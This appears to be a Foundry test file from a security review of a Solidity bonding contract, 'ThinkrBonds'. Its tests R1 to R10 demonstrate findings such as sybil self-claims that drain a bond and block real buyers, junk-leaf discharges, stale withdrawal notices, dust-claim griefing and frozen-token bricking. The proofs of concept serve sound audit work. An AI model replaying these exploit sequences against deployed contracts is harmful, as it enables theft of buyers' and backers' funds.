// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ThinkrBonds} from "../src/ThinkrBonds.sol";
import {IIdentityRegistry} from "../src/interfaces/IIdentityRegistry.sol";
import {ThinkrBondsTest} from "./ThinkrBonds.t.sol";
import {Merkle} from "./Merkle.sol";

/// @dev USDG stand in with a Paxos style freeze list.
contract FreezableUSDG is ERC20 {
    mapping(address => bool) public frozen;

    constructor() ERC20("Global Dollar", "USDG") {}

    function decimals() public pure override returns (uint8) {
        return 6;
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function freeze(address a) external {
        frozen[a] = true;
    }

    function _update(address from, address to, uint256 value) internal override {
        require(!frozen[from] && !frozen[to], "frozen");
        super._update(from, to, value);
    }
}

/// Run with: forge test --match-contract ReviewTest -vv
contract ReviewTest is ThinkrBondsTest {
    address internal sybil = makeAddr("sybil"); // a second wallet the seller controls
    address internal newOwner = makeAddr("newOwner");

    function _fund(address a, uint256 amt) internal {
        usdg.mint(a, amt);
        vm.prank(a);
        usdg.approve(address(bonds), type(uint256).max);
    }

    function _claim(address who, bytes32 ref) internal returns (uint256 id) {
        vm.prank(who);
        id = bonds.fileClaim(AGENT, ref);
    }

    // ------------------------------------------------------------------
    // R1 (HIGH/CRITICAL): seller front-runs real buyers with self claims.
    // The seller pays itself from a second wallet (net zero, money lands back
    // with the seller), files a claim that reserves the whole bond, and the real
    // buyer's claim reverts InsufficientCollateral. 48h later the sybil settles
    // and takes the whole bond. Buyer is never made whole.
    // ------------------------------------------------------------------
    function test_R1_sybil_self_claim_starves_real_buyer_and_drains_bond() public {
        _bond(100 * ONE);
        _fund(sybil, 1_000 * ONE);
        uint256 sellerStart = usdg.balanceOf(seller) + usdg.balanceOf(sybil);

        // Sybil pays one hour earlier, so its claim opens one hour before the buyer's.
        _pay(sybil, keccak256("self"), 100 * ONE);
        vm.warp(block.timestamp + 1 hours);
        uint64 e = _pay(buyer, REF, 100 * ONE); // real buyer, never served

        // Sybil claim opens first.
        _openClaims(e - 1);
        uint256 sid = _claim(sybil, keccak256("self"));
        assertEq(bonds.available(AGENT), 0);

        // Real buyer: valid claim, cannot file. For the whole claim period.
        _openClaims(e);
        vm.prank(buyer);
        vm.expectRevert(ThinkrBonds.InsufficientCollateral.selector);
        bonds.fileClaim(AGENT, REF);

        // Sybil settles and the bond goes back to the seller's own wallet.
        vm.warp(block.timestamp + 48 hours);
        bonds.settle(sid);
        assertEq(_amount(AGENT), 0);

        // Buyer still cannot file (bond is empty) and the period runs out.
        vm.prank(buyer);
        vm.expectRevert(ThinkrBonds.InsufficientCollateral.selector);
        bonds.fileClaim(AGENT, REF);

        // Seller side: bond fully recovered + buyer's 100 kept.
        uint256 sellerEnd = usdg.balanceOf(seller) + usdg.balanceOf(sybil);
        // sellerStart was taken after bonding: +100 is the bond back in full, +100 is the buyer's money.
        assertEq(sellerEnd, sellerStart + 200 * ONE);
        assertEq(usdg.balanceOf(address(bonds)), 0);
    }

    // R1b: same trick takes a BACKER's collateral out in ~51h with no notice at all.
    function test_R1b_sybil_claim_bypasses_notice_and_takes_backer_money() public {
        vm.prank(backer);
        bonds.bond(AGENT, 500 * ONE); // a third party backs the agent
        _fund(sybil, 1_000 * ONE);
        uint256 sybilStart = usdg.balanceOf(sybil);

        uint64 e = _pay(sybil, keccak256("self"), 500 * ONE); // 500 lands with seller
        _openClaims(e);
        uint256 id = _claim(sybil, keccak256("self"));
        vm.warp(block.timestamp + 48 hours);
        bonds.settle(id);

        (,,, uint64 withdrawAfter) = bonds.bonds(AGENT);
        assertEq(withdrawAfter, 0, "no notice was ever given");
        assertEq(_amount(AGENT), 0, "backer's 500 is gone");
        // seller + sybil together are up exactly the backer's 500
        assertEq(usdg.balanceOf(sybil) + usdg.balanceOf(seller), sybilStart + 10_000 * ONE + 500 * ONE);
    }

    // ------------------------------------------------------------------
    // R2 (HIGH, design): discharge only checks that (ref, anything) is in the root.
    // A seller that serves nobody seals (ref, junk) for every Paid event it sees
    // and discharges every claim; each buyer also loses its 2% stake to the bond.
    // ------------------------------------------------------------------
    function test_R2_seller_seals_junk_for_every_paid_ref_and_wins() public {
        _bond(100 * ONE);
        _pay(buyer, REF, 50 * ONE); // seller delivers nothing
        (uint64 e, bytes32[] memory proof) = _sealNow(REF, keccak256("garbage"));
        _openClaims(e);
        uint256 id = _claim(buyer, REF);
        vm.prank(seller);
        bonds.discharge(id, e, keccak256("garbage"), proof);
        assertEq(uint8(_state(id)), uint8(ThinkrBonds.ClaimState.Discharged));
        assertEq(_amount(AGENT), 101 * ONE); // buyer's 1 USDG stake added to bond
    }

    // ------------------------------------------------------------------
    // R3 (MEDIUM): notice is never consumed. After one elapsed notice the seller can
    // withdraw at any later moment, including between a buyer's payment and the
    // first instant that buyer is allowed to file (~2-3h later).
    // ------------------------------------------------------------------
    function test_R3_stale_notice_lets_seller_exit_before_claim_opens() public {
        _bond(100 * ONE);
        vm.prank(seller);
        bonds.requestWithdraw(AGENT);
        vm.warp(block.timestamp + 7 days);
        vm.prank(seller);
        bonds.withdraw(AGENT, 1 * ONE); // partial, notice stays "elapsed" forever

        vm.warp(block.timestamp + 90 days); // months of normal trading later
        uint64 e = _pay(buyer, REF, 99 * ONE);
        vm.prank(seller);
        bonds.withdraw(AGENT, 99 * ONE); // instant, no fresh notice

        _openClaims(e);
        vm.prank(buyer);
        vm.expectRevert(ThinkrBonds.InsufficientCollateral.selector);
        bonds.fileClaim(AGENT, REF);
    }

    // R3b: even with a fresh notice, a payment taken late in the notice period can
    // never be claimed: withdraw only waits for FILED claims, not claimable ones.
    function test_R3b_payment_during_notice_withdrawn_before_claimable() public {
        _bond(100 * ONE);
        vm.prank(seller);
        bonds.requestWithdraw(AGENT);
        vm.warp(block.timestamp + 7 days - 30 minutes);
        uint64 e = _pay(buyer, REF, 100 * ONE); // pay() does not refuse during notice
        vm.warp(block.timestamp + 30 minutes);
        vm.prank(seller);
        bonds.withdraw(AGENT, 100 * ONE);
        _openClaims(e);
        vm.prank(buyer);
        vm.expectRevert(ThinkrBonds.InsufficientCollateral.selector);
        bonds.fileClaim(AGENT, REF);
    }

    // ------------------------------------------------------------------
    // R4 (MEDIUM): all or nothing. A valid claim larger than available collateral
    // collects zero, not the available amount. Also pay() never checks the bond.
    // ------------------------------------------------------------------
    function test_R4_claim_above_bond_collects_nothing() public {
        _bond(100 * ONE);
        uint64 e = _pay(buyer, REF, 101 * ONE);
        _openClaims(e);
        vm.prank(buyer);
        vm.expectRevert(ThinkrBonds.InsufficientCollateral.selector);
        bonds.fileClaim(AGENT, REF);
    }

    // ------------------------------------------------------------------
    // R5 (MEDIUM, griefing): any address can keep a seller's withdraw blocked
    // forever with dust payments + staggered claims. Payment is refunded on settle
    // and the stake comes back, so an unanswered chain costs only gas.
    // ------------------------------------------------------------------
    function test_R5_dust_claim_chain_blocks_withdraw_indefinitely() public {
        _bond(100 * ONE);
        vm.prank(seller);
        bonds.requestWithdraw(AGENT);
        uint256 attackerStart = usdg.balanceOf(stranger);

        uint256 prev;
        for (uint256 i; i < 10; ++i) {
            // pay 1 micro-USDG, wait until claimable, file, then settle the previous one
            bytes32 r = keccak256(abi.encode("dust", i));
            uint64 e = _pay(stranger, r, 1);
            _openClaims(e);
            uint256 id = _claim(stranger, r);
            if (prev != 0) bonds.settle(prev); // previous is >= 48h old
            prev = id;
            assertGt(_reserved(AGENT), 0); // a claim is open at every point in time
            (,,, uint64 wa) = bonds.bonds(AGENT);
            if (block.timestamp >= wa) {
                vm.prank(seller);
                vm.expectRevert(ThinkrBonds.ClaimsOpen.selector);
                bonds.withdraw(AGENT, 100 * ONE);
            }
            vm.warp(block.timestamp + 45 hours);
        }
        assertGt(block.timestamp, 20 days, "blocked for > 20 days");
        // attacker is out only the one dust payment + one stake still open
        assertGe(usdg.balanceOf(stranger) + 1 + MIN_CLAIM_BOND, attackerStart);
    }

    // ------------------------------------------------------------------
    // R6 (LOW/MEDIUM): a burned / unresolvable agent locks its bond forever.
    // withdraw() calls ownerOf, which reverts.
    // ------------------------------------------------------------------
    function test_R6_burned_agent_bond_locked_forever() public {
        _bond(100 * ONE);
        vm.prank(seller);
        bonds.requestWithdraw(AGENT);
        vm.warp(block.timestamp + 7 days);
        registry.register(AGENT, address(0)); // burn
        vm.prank(seller);
        vm.expectRevert();
        bonds.withdraw(AGENT, 100 * ONE);
        assertEq(usdg.balanceOf(address(bonds)), 100 * ONE);
    }

    // ------------------------------------------------------------------
    // R7 (LOW): settle pushes funds. A frozen claimant (Paxos freeze list) makes
    // settle revert, the claim stays Open, reserved never clears, and the seller
    // can never withdraw again.
    // ------------------------------------------------------------------
    function test_R7_frozen_claimant_bricks_seller_withdraw() public {
        FreezableUSDG f = new FreezableUSDG();
        ThinkrBonds b2 = new ThinkrBonds(
            IIdentityRegistry(address(registry)), IERC20(address(f)), MIN_BOND, MIN_CLAIM_BOND
        );
        address[2] memory who = [seller, buyer];
        for (uint256 i; i < 2; ++i) {
            f.mint(who[i], 1_000 * ONE);
            vm.prank(who[i]);
            f.approve(address(b2), type(uint256).max);
        }
        vm.prank(seller);
        b2.bond(AGENT, 100 * ONE);
        uint64 e = b2.currentEpoch();
        vm.prank(buyer);
        b2.pay(AGENT, REF, 10 * ONE);
        vm.warp(b2.attestDeadline(e + 1));
        vm.prank(buyer);
        uint256 id = b2.fileClaim(AGENT, REF);
        vm.prank(seller);
        b2.requestWithdraw(AGENT);

        f.freeze(buyer);
        vm.warp(block.timestamp + 365 days);
        vm.expectRevert(bytes("frozen"));
        b2.settle(id);
        vm.prank(seller);
        vm.expectRevert(ThinkrBonds.ClaimsOpen.selector);
        b2.withdraw(AGENT, 1 * ONE);
    }

    // ------------------------------------------------------------------
    // R8 (LOW): the leaf binds only (ref, digest), not the buyer or paymentId.
    // Two buyers on the same ref: one delivery discharges both claims.
    // ------------------------------------------------------------------
    function test_R8_one_leaf_discharges_two_buyers_on_same_ref() public {
        _bond(100 * ONE);
        _pay(buyer, REF, 10 * ONE);
        _pay(stranger, REF, 10 * ONE); // different paymentId, same ref
        (uint64 e, bytes32[] memory proof) = _sealNow(REF, DIGEST); // delivered once
        _openClaims(e);
        uint256 a = _claim(buyer, REF);
        uint256 b = _claim(stranger, REF);
        vm.startPrank(seller);
        bonds.discharge(a, e, DIGEST, proof);
        bonds.discharge(b, e, DIGEST, proof);
        vm.stopPrank();
        assertEq(uint8(_state(b)), uint8(ThinkrBonds.ClaimState.Discharged));
    }

    // ------------------------------------------------------------------
    // R9 (MEDIUM, ownership): the bond and the notice clock belong to the agentId,
    // not to whoever posted it. After a transfer the new owner can pull the old
    // owner's collateral immediately using the OLD owner's elapsed notice, and the
    // old owner (who was paid) loses the right to discharge.
    // ------------------------------------------------------------------
    function test_R9_transfer_new_owner_inherits_elapsed_notice_and_bond() public {
        _bond(100 * ONE);
        vm.prank(seller);
        bonds.requestWithdraw(AGENT);
        vm.warp(block.timestamp + 7 days);

        uint64 e = _pay(buyer, REF, 10 * ONE); // paid to OLD owner
        (, bytes32[] memory proof) = _sealNow(REF, DIGEST); // old owner delivered + sealed
        registry.register(AGENT, newOwner); // NFT sold

        _openClaims(e);
        uint256 id = _claim(buyer, REF);
        vm.prank(seller);
        vm.expectRevert(ThinkrBonds.NotAgentOwner.selector);
        bonds.discharge(id, e, DIGEST, proof); // honest old owner cannot defend

        vm.warp(block.timestamp + 48 hours);
        bonds.settle(id); // honest delivery, bond pays anyway
        vm.prank(newOwner);
        bonds.withdraw(AGENT, 90 * ONE); // no notice of its own
        assertEq(usdg.balanceOf(newOwner), 90 * ONE);
    }

    // ------------------------------------------------------------------
    // R10 (INFO): discharge has no deadline. If nobody calls settle after 48h the
    // seller can still discharge, and settle vs discharge at the boundary is a race.
    // ------------------------------------------------------------------
    function test_R10_discharge_after_challenge_window() public {
        _bond(100 * ONE);
        _pay(buyer, REF, 10 * ONE);
        (uint64 e, bytes32[] memory proof) = _sealNow(REF, DIGEST);
        _openClaims(e);
        uint256 id = _claim(buyer, REF);
        vm.warp(block.timestamp + 30 days);
        vm.prank(seller);
        bonds.discharge(id, e, DIGEST, proof);
        assertEq(uint8(_state(id)), uint8(ThinkrBonds.ClaimState.Discharged));
    }

    // ------------------------------------------------------------------
    // Accounting check (no finding): balance == sum(bond.amount) + open stakes
    // through a mixed sequence, including a discharge and a settle.
    // ------------------------------------------------------------------
    function test_accounting_holds_through_mixed_sequence() public {
        _bond(100 * ONE);
        _pay(buyer, REF, 10 * ONE);
        _pay(stranger, keccak256("o2"), 20 * ONE);
        (uint64 e, bytes32[] memory proof) = _sealNow(REF, DIGEST);
        _openClaims(e);
        uint256 a = _claim(buyer, REF);
        uint256 b = _claim(stranger, keccak256("o2"));
        (,,,, uint128 sa,,,,) = bonds.claims(a);
        (,,,, uint128 sb,,,,) = bonds.claims(b);
        assertEq(usdg.balanceOf(address(bonds)), _amount(AGENT) + sa + sb);
        vm.prank(seller);
        bonds.discharge(a, e, DIGEST, proof);
        assertEq(usdg.balanceOf(address(bonds)), _amount(AGENT) + sb);
        vm.warp(block.timestamp + 48 hours);
        bonds.settle(b);
        assertEq(usdg.balanceOf(address(bonds)), _amount(AGENT));
        assertEq(_reserved(AGENT), 0);
    }
}
